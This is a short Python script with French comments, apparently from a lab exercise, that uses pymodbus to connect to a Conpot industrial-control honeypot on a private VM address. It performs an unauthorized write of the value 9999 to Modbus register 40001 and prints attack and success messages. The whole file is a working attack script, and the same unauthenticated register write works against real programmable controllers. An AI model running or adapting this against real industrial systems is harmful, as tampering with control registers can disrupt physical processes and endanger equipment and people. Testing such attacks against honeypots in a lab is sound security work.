from pymodbus.client import ModbusTcpClient

# Connexion à Conpot (adresse IP de la VM Ubuntu)
target_ip = '192.168.37.137'
client = ModbusTcpClient(target_ip, port=502)
client.connect()

print(f"[ATTAQUE] Connexion à {target_ip}...")

# Écriture non-autorisée : on modifie le registre 40001 avec une valeur arbitraire
result = client.write_register(address=40001, value=9999, device_id=2)

if result.isError():
    print("Erreur:", result)
else:
    print("[SUCCÈS] Écriture effectuée ! Registre 40001 modifié à 9999.")

client.close()
